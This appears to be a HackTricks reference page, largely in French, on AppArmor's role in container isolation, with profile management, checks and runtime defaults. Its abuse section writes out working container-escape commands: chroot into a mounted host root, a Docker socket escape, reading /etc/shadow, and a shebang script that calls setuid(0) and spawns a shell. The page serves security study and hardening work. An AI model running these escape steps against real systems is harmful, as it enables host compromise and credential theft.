# AppArmor

{{#include ../../../../banners/hacktricks-training.md}}

## Overview

AppArmor est un système de **Mandatory Access Control** qui applique des restrictions via des profils par programme. Contrairement aux contrôles DAC traditionnels, qui dépendent fortement de la propriété user et group, AppArmor permet au kernel d'appliquer une politique liée directement au processus. Dans les environnements container, c'est important car un workload peut disposer de suffisamment de privilèges traditionnels pour tenter une action et se voir malgré tout refuser l'accès parce que son profil AppArmor n'autorise pas le path, le mount, le comportement réseau ou l'utilisation d'une capability concernés.

Le point conceptuel le plus important est qu'AppArmor est **path-based**. Il raisonne sur l'accès au filesystem via des règles de path plutôt que via des labels comme le fait SELinux. Cela le rend accessible et puissant, mais cela signifie aussi que les bind mounts et les agencements alternatifs de chemins méritent une attention particulière. Si le même contenu hôte devient atteignable sous un chemin différent, l'effet de la politique peut ne pas être celui que l'opérateur avait initialement prévu.

## Role In Container Isolation

Les revues de sécurité des containers s'arrêtent souvent aux capabilities et à seccomp, mais AppArmor reste pertinent après ces vérifications. Imaginez un container qui a plus de privilèges qu'il ne devrait, ou un workload qui a besoin d'une capability supplémentaire pour des raisons opérationnelles. AppArmor peut toujours restreindre l'accès aux fichiers, le comportement de mount, le networking et les patterns d'exécution de manière à bloquer la voie d'abus évidente. C'est pourquoi désactiver AppArmor "just to get the application working" peut discrètement transformer une configuration seulement risquée en une configuration activement exploitable.

## Lab

To check whether AppArmor is active on the host, use:
```bash
aa-status 2>/dev/null || apparmor_status 2>/dev/null
cat /sys/module/apparmor/parameters/enabled 2>/dev/null
```
Pour voir sous quel contexte s'exécute le processus du conteneur actuel :
```bash
docker run --rm ubuntu:24.04 cat /proc/self/attr/current
docker run --rm --security-opt apparmor=unconfined ubuntu:24.04 cat /proc/self/attr/current
```
La différence est instructive. Dans le cas normal, le processus devrait afficher un contexte AppArmor lié au profil choisi par le runtime. Dans le cas unconfined, cette couche de restriction supplémentaire disparaît.

Vous pouvez aussi inspecter ce que Docker pense avoir appliqué :
```bash
docker inspect <container> | jq '.[0].AppArmorProfile'
```
## Utilisation à l'exécution

Docker peut appliquer un profil AppArmor par défaut ou personnalisé lorsque l'hôte le supporte. Podman peut aussi s'intégrer à AppArmor sur les systèmes basés sur AppArmor, bien que sur les distributions privilégiant SELinux l'autre système MAC prenne souvent le pas. Kubernetes peut exposer la politique AppArmor au niveau des workloads sur les nœuds qui prennent effectivement en charge AppArmor. LXC et les environnements de containers système des familles Ubuntu utilisent aussi AppArmor de façon extensive.

L'essentiel est qu'AppArmor n'est pas une "fonctionnalité Docker". C'est une fonctionnalité du noyau de l'hôte que plusieurs runtimes peuvent choisir d'appliquer. Si l'hôte ne le supporte pas ou si le runtime est démarré en mode 'unconfined', la protection supposée n'est pas réellement présente.

Sur des hôtes AppArmor compatibles Docker, le profil par défaut le plus connu est `docker-default`. Ce profil est généré à partir du template AppArmor de Moby et est important car il explique pourquoi certains PoCs basés sur des capabilities échouent encore dans un conteneur par défaut. En termes généraux, `docker-default` autorise les fonctionnalités réseau normales, interdit les écritures sur une grande partie de `/proc`, interdit l'accès aux parties sensibles de `/sys`, bloque les opérations de mount et restreint ptrace de sorte que ce ne soit pas une primitive générale pour sonder l'hôte. Comprendre cette ligne de base aide à distinguer "le conteneur a `CAP_SYS_ADMIN`" de "le conteneur peut réellement utiliser cette capability contre les interfaces du noyau qui m'intéressent".

## Gestion des profils

Les profils AppArmor sont habituellement stockés sous `/etc/apparmor.d/`. Une convention de nommage courante consiste à remplacer les slashs du chemin de l'exécutable par des points. Par exemple, un profil pour `/usr/bin/man` est couramment stocké sous `/etc/apparmor.d/usr.bin.man`. Ce détail est important tant pour la défense que pour l'évaluation, car une fois que vous connaissez le nom du profil actif, vous pouvez souvent localiser rapidement le fichier correspondant sur l'hôte.

Les commandes de gestion utiles côté hôte comprennent :
```bash
aa-status
aa-enforce
aa-complain
apparmor_parser
aa-genprof
aa-logprof
aa-mergeprof
```
La raison pour laquelle ces commandes sont importantes dans une référence container-security est qu'elles expliquent comment les profils sont réellement construits, chargés, passés en complain mode, et modifiés après des changements d'application. Si un opérateur a l'habitude de passer les profils en complain mode pendant le dépannage et oublie de restaurer l'enforcement, le conteneur peut sembler protégé dans la documentation alors qu'il se comporte beaucoup plus lâchement en réalité.

### Création et mise à jour des profils

`aa-genprof` peut observer le comportement de l'application et aider à générer un profil de manière interactive :
```bash
sudo aa-genprof /path/to/binary
/path/to/binary
```
`aa-easyprof` peut générer un profil modèle qui peut ensuite être chargé avec `apparmor_parser`:
```bash
sudo aa-easyprof /path/to/binary
sudo apparmor_parser -a /etc/apparmor.d/path.to.binary
```
Quand le binaire change et que la politique doit être mise à jour, `aa-logprof` peut rejouer les refus trouvés dans les logs et aider l'opérateur à décider s'il faut les autoriser ou les refuser :
```bash
sudo aa-logprof
```
### Journaux

Les refus d'AppArmor sont souvent visibles via `auditd`, syslog, ou des outils tels que `aa-notify`:
```bash
sudo aa-notify -s 1 -v
```
Ceci est utile opérationnellement et offensivement. Les défenseurs l'utilisent pour affiner les profiles. Les attaquants l'utilisent pour déterminer quel chemin exact ou quelle opération est refusée et si AppArmor est le contrôle qui bloque un exploit chain.

### Identifier le fichier de profile exact

Lorsque un runtime affiche un AppArmor profile name spécifique pour un container, il est souvent utile de faire correspondre ce nom au profile file sur le disque :
```bash
docker inspect <container> | grep AppArmorProfile
find /etc/apparmor.d/ -maxdepth 1 -name '*<profile-name>*' 2>/dev/null
```
Cela est particulièrement utile lors d'un examen côté hôte car cela comble le fossé entre "le conteneur indique qu'il s'exécute sous le profil `lowpriv`" et "les règles réelles se trouvent dans ce fichier spécifique qui peut être audité ou rechargé".

## Mauvaises configurations

The most obvious mistake is `apparmor=unconfined`. Administrators often set it while debugging an application that failed because the profile correctly blocked something dangerous or unexpected. If the flag remains in production, the entire MAC layer has effectively been removed.

Another subtle problem is assuming that bind mounts are harmless because the file permissions look normal. Since AppArmor is path-based, exposing host paths under alternate mount locations can interact badly with path rules. A third mistake is forgetting that a profile name in a config file means very little if the host kernel is not actually enforcing AppArmor.

## Abus

When AppArmor is gone, operations that were previously constrained may suddenly work: reading sensitive paths through bind mounts, accessing parts of procfs or sysfs that should have remained harder to use, performing mount-related actions if capabilities/seccomp also permit them, or using paths that a profile would normally deny. AppArmor is often the mechanism that explains why a capability-based breakout attempt "should work" on paper but still fails in practice. Remove AppArmor, and the same attempt may start succeeding.

If you suspect AppArmor is the main thing stopping a path-traversal, bind-mount, or mount-based abuse chain, the first step is usually to compare what becomes accessible with and without a profile. For example, if a host path is mounted inside the container, start by checking whether you can traverse and read it:
```bash
cat /proc/self/attr/current
find /host -maxdepth 2 -ls 2>/dev/null | head
find /host/etc -maxdepth 1 -type f 2>/dev/null | head
```
Si le conteneur dispose également d'une capacité dangereuse telle que `CAP_SYS_ADMIN`, l'un des tests les plus pratiques consiste à vérifier si AppArmor est le contrôle bloquant les opérations de montage ou l'accès aux systèmes de fichiers kernel sensibles :
```bash
capsh --print | grep cap_sys_admin
mount | head
mkdir -p /tmp/testmnt
mount -t proc proc /tmp/testmnt 2>/dev/null || echo "mount blocked"
mount -t tmpfs tmpfs /tmp/testmnt 2>/dev/null || echo "tmpfs blocked"
```
Dans des environnements où un host path est déjà disponible via un bind mount, la perte d'AppArmor peut aussi transformer un problème d'information-disclosure en lecture seule en un accès direct aux fichiers de l'hôte :
```bash
ls -la /host/root 2>/dev/null
cat /host/etc/shadow 2>/dev/null | head
find /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
```
Le but de ces commandes n'est pas qu'AppArmor seul crée le breakout. Il s'agit plutôt du fait que, une fois AppArmor supprimé, de nombreux chemins d'abus basés sur le système de fichiers et les montages deviennent immédiatement testables.

### Exemple complet : AppArmor désactivé + racine de l'hôte montée

Si le container a déjà la racine de l'hôte bind-mounted at `/host`, removing AppArmor can turn a blocked filesystem abuse path into a complete host escape:
```bash
cat /proc/self/attr/current
ls -la /host
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Une fois que le shell s'exécute via le système de fichiers hôte, la charge de travail a effectivement échappé à la frontière du conteneur :
```bash
id
hostname
cat /etc/shadow | head
```
### Exemple complet : AppArmor désactivé + Runtime Socket

Si la véritable barrière était AppArmor autour de l'état d'exécution, une socket montée peut suffire pour une évasion complète :
```bash
find /host/run /host/var/run -maxdepth 2 -name docker.sock 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Le chemin exact dépend du point de montage, mais le résultat final est le même : AppArmor n'empêche plus l'accès à la runtime API, et la runtime API peut lancer un container compromettant pour l'hôte.

### Exemple complet : Path-Based Bind-Mount Bypass

Parce qu'AppArmor est path-based, protéger `/proc/**` ne protège pas automatiquement le même contenu procfs de l'hôte lorsqu'il est accessible via un chemin différent :
```bash
mount | grep '/host/proc'
find /host/proc/sys -maxdepth 3 -type f 2>/dev/null | head -n 20
cat /host/proc/sys/kernel/core_pattern 2>/dev/null
```
L'impact dépend de ce qui est précisément monté et de savoir si le chemin alternatif contourne également d'autres contrôles, mais ce schéma est l'une des raisons les plus évidentes pour lesquelles AppArmor doit être évalué conjointement avec la disposition des points de montage plutôt qu'isolément.

### Exemple complet : Shebang Bypass

La politique AppArmor cible parfois un chemin d'interpréteur d'une manière qui ne tient pas pleinement compte de l'exécution de scripts via la gestion du shebang. Un exemple historique impliquait l'utilisation d'un script dont la première ligne pointe vers un interpréteur confiné :
```bash
cat <<'EOF' > /tmp/test.pl
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";
EOF
chmod +x /tmp/test.pl
/tmp/test.pl
```
Ce type d'exemple est important pour rappeler que l'intention d'un profil et la sémantique d'exécution réelle peuvent diverger. Lors de l'examen d'AppArmor dans des environnements de conteneurs, les chaînes d'interpréteurs et les chemins d'exécution alternatifs méritent une attention particulière.

## Checks

L'objectif de ces vérifications est de répondre rapidement à trois questions : AppArmor est-il activé sur l'hôte, le processus actuel est-il confiné, et le runtime a-t-il réellement appliqué un profil à ce conteneur ?
```bash
cat /proc/self/attr/current                         # Current AppArmor label for this process
aa-status 2>/dev/null                              # Host-wide AppArmor status and loaded/enforced profiles
docker inspect <container> | jq '.[0].AppArmorProfile'   # Profile the runtime says it applied
find /etc/apparmor.d -maxdepth 1 -type f 2>/dev/null | head -n 50   # Host-side profile inventory when visible
```
Ce qui est intéressant ici :

- Si `/proc/self/attr/current` affiche `unconfined`, la charge de travail ne bénéficie pas du confinement AppArmor.
- Si `aa-status` indique AppArmor désactivé ou non chargé, tout nom de profil dans la config runtime est surtout cosmétique.
- Si `docker inspect` affiche `unconfined` ou un profil personnalisé inattendu, c'est souvent la raison pour laquelle une voie d'abus basée sur le système de fichiers ou les montages fonctionne.

Si un container dispose déjà de privilèges élevés pour des raisons opérationnelles, laisser AppArmor activé fait souvent la différence entre une exception contrôlée et une défaillance de sécurité bien plus étendue.

## Paramètres d'exécution par défaut

| Runtime / platform | État par défaut | Comportement par défaut | Affaiblissements manuels courants |
| --- | --- | --- | --- |
| Docker Engine | Activé par défaut sur les hôtes compatibles AppArmor | Utilise le profil AppArmor `docker-default` sauf si remplacé | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Podman | Dépendant de l'hôte | AppArmor est pris en charge via `--security-opt`, mais la valeur par défaut exacte dépend de l'hôte/runtime et est moins universelle que le profil `docker-default` documenté de Docker | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Kubernetes | Par défaut conditionnel | Si `appArmorProfile.type` n'est pas spécifié, la valeur par défaut est `RuntimeDefault`, mais elle n'est appliquée que lorsque AppArmor est activé sur le nœud | `securityContext.appArmorProfile.type: Unconfined`, `securityContext.appArmorProfile.type: Localhost` with a weak profile, nodes without AppArmor support |
| containerd / CRI-O under Kubernetes | Suit le support du nœud/runtime | Les runtimes couramment supportés par Kubernetes prennent en charge AppArmor, mais l'application effective dépend toujours du support du nœud et des paramètres de la charge de travail | Same as Kubernetes row; direct runtime configuration can also skip AppArmor entirely |

Pour AppArmor, la variable la plus importante est souvent le **host**, pas seulement le runtime. Un réglage de profil dans un manifeste ne crée pas de confinement sur un nœud où AppArmor n'est pas activé.
{{#include ../../../../banners/hacktricks-training.md}}
